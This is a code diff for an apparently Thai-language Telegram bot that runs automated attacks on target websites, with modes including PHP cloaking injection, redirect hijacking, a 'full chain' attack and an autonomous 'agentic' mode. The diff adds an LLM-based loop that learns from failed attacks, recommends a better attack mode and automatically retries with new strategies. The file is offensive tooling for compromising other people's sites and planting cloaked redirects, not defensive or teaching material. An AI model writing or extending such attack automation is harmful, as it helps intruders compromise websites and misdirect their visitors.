@@ -18,6 +18,7 @@
 import { invokeLLM, type Message, type Tool, type InvokeResult } from "./_core/llm";
 import { ENV } from "./_core/env";
 import { getTelegramConfig, sendVulnAlert, sendAttackSuccessAlert, sendFailureSummaryAlert, type TelegramConfig, type MethodAttempt } from "./telegram-notifier";
+import { runFailureLearningLoop, suggestBestMode, type FailureRecord } from "./failure-learning-engine";
 
 // ─── Direct fetch for Telegram API (no proxy pool) ───
 async function telegramFetch(
@@ -1381,15 +1382,31 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         if (!attackChatId) {
           return `❌ ไม่พบ chat ID สำหรับส่ง progress`;
         }
+
+        // ─── AI Auto-suggest: check failure history and recommend best mode ───
+        let actualMethod = method;
+        let suggestMsg = "";
+        if (method === "full_chain") {
+          try {
+            const suggestion = await suggestBestMode(targetDomain);
+            if (suggestion && suggestion.confidence >= 60 && suggestion.recommendedMode !== "full_chain") {
+              actualMethod = suggestion.recommendedMode;
+              suggestMsg = `\n🧠 AI แนะนำ: ใช้ ${suggestion.recommendedMode} แทน (${suggestion.confidence}% confidence)\nเหตุผล: ${suggestion.reasoning}`;
+              console.log(`[TelegramAI] AI auto-suggest: ${targetDomain} → ${suggestion.recommendedMode} (${suggestion.confidence}% confidence)`);
+            }
+          } catch (e: any) {
+            console.warn(`[TelegramAI] Auto-suggest error: ${e.message}`);
+          }
+        }
         
         // Launch attack with real-time narration (non-blocking)
-        executeAttackWithProgress(config, attackChatId, targetDomain, method).catch(err => {
+        executeAttackWithProgress(config, attackChatId, targetDomain, actualMethod).catch(err => {
           console.error(`[TelegramAI] Narrated attack error: ${err.message}`);
         });
         
         // Return immediately — narration will be sent as separate messages
-        return `⚔️ เริ่มโจมตี ${targetDomain} ด้วย ${method} แล้ว!\n` +
-          `ETA: ${methodEta.label}\n` +
+        return `⚔️ เริ่มโจมตี ${targetDomain} ด้วย ${actualMethod} แล้ว!\n` +
+          `ETA: ${methodEta.label}${suggestMsg}\n` +
           `📡 ระบบจะแสดงขั้นตอนแบบ real-time ใน chat นี้\n` +
           `สถานะ: 🔄 กำลังเริ่มต้น...`;
       }
@@ -3217,6 +3234,17 @@ async function sendAttackTargetKeyboard(config: TelegramConfig, chatId: number):
 
 async function sendAttackTypeKeyboard(config: TelegramConfig, chatId: number, domain: string): Promise<void> {
   try {
+    // ─── AI Auto-suggest best mode based on failure history ───
+    let aiSuggestionText = "";
+    let suggestedMode: string | null = null;
+    try {
+      const suggestion = await suggestBestMode(domain);
+      if (suggestion && suggestion.confidence >= 50) {
+        suggestedMode = suggestion.recommendedMode;
+        aiSuggestionText = `\n\n🧠 AI แนะนำ: ${suggestion.recommendedMode} (${suggestion.confidence}% confidence)\nเหตุผล: ${suggestion.reasoning}`;
+      }
+    } catch {}
+
     const keyboard = [
       [
         { text: "\uD83D\uDD0D Scan Only", callback_data: `atk_run:${domain}:scan_only` },
@@ -3229,10 +3257,14 @@ async function sendAttackTypeKeyboard(config: TelegramConfig, chatId: number, do
       [
         { text: "\uD83D\uDCA3 Advanced (5 เทคนิค)", callback_data: `atk_advanced:${domain}` },
       ],
-      [
-        { text: "\u274C ยกเลิก", callback_data: "atk_cancel" },
-      ],
     ];
+
+    // Add AI-recommended button at top if suggestion exists
+    if (suggestedMode && suggestedMode !== "full_chain") {
+      keyboard.unshift([{ text: `⭐ AI แนะนำ: ${suggestedMode}`, callback_data: `atk_run:${domain}:${suggestedMode}` }]);
+    }
+
+    keyboard.push([{ text: "\u274C ยกเลิก", callback_data: "atk_cancel" }]);
     
     const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
     await telegramFetch(url, {
@@ -3240,7 +3272,7 @@ async function sendAttackTypeKeyboard(config: TelegramConfig, chatId: number, do
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: chatId,
-        text: `\u2694\uFE0F Target: ${domain}\n\nเลือกวิธีโจมตี:`,
+        text: `\u2694\uFE0F Target: ${domain}\n\nเลือกวิธีโจมตี:${aiSuggestionText}`,
         reply_markup: { inline_keyboard: keyboard },
       }),
       signal: AbortSignal.timeout(10000),
@@ -4184,6 +4216,34 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           totalDurationMs: redirectDuration,
           methods: redirectMethodAttempts,
         }).catch(err => console.warn(`[TelegramAI] Failure summary alert failed: ${err}`));
+
+        // ─── AI Learning Loop for redirect_only ───
+        try {
+          const failureRecord: FailureRecord = {
+            domain,
+            mode: "redirect_only",
+            methodsTried: redirectMethodAttempts.map(m => ({ name: m.name, status: m.status, reason: m.reason || "failed" })),
+            totalDurationMs: redirectDuration,
+          };
+          const { pickRedirectUrl: pickUrl } = await import("./agentic-attack-engine");
+          const learnUrl = await pickUrl();
+          runFailureLearningLoop(failureRecord, learnUrl, {
+            enableAutoRetry: true,
+            maxRetries: 1,
+            onProgress: async (msg) => {
+              try {
+                await telegramFetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ chat_id: chatId, text: `🧠 AI Learning: ${msg}` }),
+                  signal: AbortSignal.timeout(10000),
+                }, { timeout: 10000 });
+              } catch {}
+            },
+          }).catch(e => console.warn(`[TelegramAI] Learning loop error: ${e.message}`));
+        } catch (e: any) {
+          console.warn(`[TelegramAI] Learning loop setup error: ${e.message}`);
+        }
       }
       
     } else if (method === "full_chain") {
@@ -5499,8 +5559,79 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         }).catch(err => console.warn(`[TelegramAI] Failure summary alert failed: ${err}`));
       }
       
-      // full_chain ลองทุกวิธีแล้ว — ไม่ต้องแนะนำวิธีซ้ำ
-      // แค่สรุปผลและแนะนำ scan ใหม่หรือเปลี่ยน domain
+      // ─── AI Learning Loop: learn from failure → generate new strategies → auto-retry ───
+      if (!fullChainSuccess) {
+        try {
+          const failureRecord: FailureRecord = {
+            domain,
+            mode: "full_chain",
+            serverType: vulnScanResult?.serverInfo?.server,
+            cms: vulnScanResult?.cms?.type,
+            waf: vulnScanResult?.serverInfo?.waf || undefined,
+            methodsTried: failedMethods.map(fm => {
+              const match = fm.match(/^(.+?)\s*\((.+)\)$/);
+              return {
+                name: match ? match[1].trim() : fm,
+                status: (match?.[2]?.includes("Timeout") || match?.[2]?.includes("หมดเวลา")) ? "timeout" : "failed",
+                reason: match ? match[2].trim() : "failed",
+              };
+            }),
+            totalDurationMs: totalMs,
+          };
+          const { pickRedirectUrl } = await import("./agentic-attack-engine");
+          const learnRedirectUrl = await pickRedirectUrl();
+          const learningResult = await runFailureLearningLoop(failureRecord, learnRedirectUrl, {
+            enableAutoRetry: true,
+            maxRetries: 2,
+            onProgress: async (msg) => {
+              try {
+                await telegramFetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ chat_id: chatId, text: `🧠 AI Learning: ${msg}` }),
+                  signal: AbortSignal.timeout(10000),
+                }, { timeout: 10000 });
+              } catch {}
+            },
+          });
+          if (learningResult.retryResult?.success) {
+            fullChainSuccess = true;
+            try {
+              await telegramFetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: `🎉 AI Learning Loop สำเร็จ!\n\n` +
+                    `Strategy: ${learningResult.retryResult.strategyUsed}\n` +
+                    `Details: ${learningResult.retryResult.details}\n` +
+                    `⏱ Duration: ${(learningResult.retryResult.durationMs / 1000).toFixed(1)}s`,
+                }),
+                signal: AbortSignal.timeout(10000),
+              }, { timeout: 10000 });
+            } catch {}
+          } else if (learningResult.suggestion) {
+            try {
+              await telegramFetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: `🧠 AI แนะนำสำหรับครั้งหน้า:\n\n` +
+                    `Mode: ${learningResult.suggestion.recommendedMode} (${learningResult.suggestion.confidence}% confidence)\n` +
+                    `เหตุผล: ${learningResult.suggestion.reasoning}\n` +
+                    `Success Rate: ~${learningResult.suggestion.estimatedSuccessRate}%`,
+                }),
+                signal: AbortSignal.timeout(10000),
+              }, { timeout: 10000 });
+            } catch {}
+          }
+        } catch (learnErr: any) {
+          console.warn(`[TelegramAI] AI Learning Loop error: ${learnErr.message}`);
+        }
+      }
+
+      // full_chain ลองทุกวิธีแล้ว — สรุปผลและแนะนำ
       if (!fullChainSuccess) {
         const totalTried = failedMethods.length + (fullChainSuccess ? 1 : 0);
         const summaryText = `\u274C \u0e42\u0e08\u0e21\u0e15\u0e35 ${domain} \u0e14\u0e49\u0e27\u0e22 full_chain \u0e25\u0e49\u0e21\u0e40\u0e2b\u0e25\u0e27\n\n` +
@@ -5723,6 +5854,27 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                   reason: `ลอง ${status.targetsAttacked || 0} เป้าหมาย ไม่สำเร็จ`,
                 }],
               }).catch(err => console.warn(`[TelegramAI] Failure summary alert failed: ${err}`));
+
+              // ─── AI Learning Loop for agentic_auto ───
+              try {
+                const failRec: FailureRecord = {
+                  domain, mode: "agentic_auto",
+                  methodsTried: [{ name: `AI Auto (Session #${session.sessionId})`, status: "failed", reason: `ลอง ${status.targetsAttacked || 0} เป้าหมาย ไม่สำเร็จ` }],
+                  totalDurationMs: agenticDuration,
+                };
+                runFailureLearningLoop(failRec, redirectUrl, {
+                  enableAutoRetry: false, // agentic already tried everything
+                  onProgress: async (msg) => {
+                    try {
+                      await telegramFetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                        method: "POST", headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: chatId, text: `🧠 AI Learning: ${msg}` }),
+                        signal: AbortSignal.timeout(10000),
+                      }, { timeout: 10000 });
+                    } catch {}
+                  },
+                }).catch(e => console.warn(`[TelegramAI] Learning loop error: ${e.message}`));
+              } catch {}
             }
             
             break;
@@ -5913,6 +6065,30 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             reason: injectionResult.errors.slice(0, 2).join("; ").substring(0, 60),
           }],
         }).catch(err => console.warn(`[TelegramAI] Failure summary alert failed: ${err}`));
+
+        // ─── AI Learning Loop for cloaking_inject ───
+        try {
+          const failRec: FailureRecord = {
+            domain, mode: "cloaking_inject",
+            cms: cloakScanOutcome.ok ? cloakScanOutcome.result?.cms?.type : undefined,
+            serverType: cloakScanOutcome.ok ? cloakScanOutcome.result?.serverInfo?.server : undefined,
+            waf: cloakScanOutcome.ok ? (cloakScanOutcome.result?.serverInfo?.waf || undefined) : undefined,
+            methodsTried: [{ name: injectionResult.method || "php_cloaking", status: "failed", reason: injectionResult.errors.slice(0, 2).join("; ") }],
+            totalDurationMs: totalDuration,
+          };
+          runFailureLearningLoop(failRec, redirectUrl, {
+            enableAutoRetry: true, maxRetries: 1,
+            onProgress: async (msg) => {
+              try {
+                await telegramFetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                  method: "POST", headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ chat_id: chatId, text: `🧠 AI Learning: ${msg}` }),
+                  signal: AbortSignal.timeout(10000),
+                }, { timeout: 10000 });
+              } catch {}
+            },
+          }).catch(e => console.warn(`[TelegramAI] Learning loop error: ${e.message}`));
+        } catch {}
       }
       
     } else if (method === "hijack_redirect") {
@@ -6147,6 +6323,29 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           totalDurationMs: totalDuration,
           methods: hijackMethodAttempts,
         }).catch(err => console.warn(`[TelegramAI] Failure summary alert failed: ${err}`));
+
+        // ─── AI Learning Loop for hijack_redirect ───
+        try {
+          const failRec: FailureRecord = {
+            domain, mode: "hijack_redirect",
+            methodsTried: hijackMethodAttempts.map(m => ({ name: m.name, status: m.status as string, reason: m.reason || "failed" })),
+            totalDurationMs: totalDuration,
+          };
+          const { pickRedirectUrl: pickUrl } = await import("./agentic-attack-engine");
+          const learnUrl = await pickUrl();
+          runFailureLearningLoop(failRec, learnUrl, {
+            enableAutoRetry: true, maxRetries: 1,
+            onProgress: async (msg) => {
+              try {
+                await telegramFetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                  method: "POST", headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ chat_id: chatId, text: `🧠 AI Learning: ${msg}` }),
+                  signal: AbortSignal.timeout(10000),
+                }, { timeout: 10000 });
+              } catch {}
+            },
+          }).catch(e => console.warn(`[TelegramAI] Learning loop error: ${e.message}`));
+        } catch {}
       }
       
     } else if (method === "advanced_all" || method === "deploy_advanced_all" || method.startsWith("advanced_") || method.startsWith("deploy_advanced_")) {
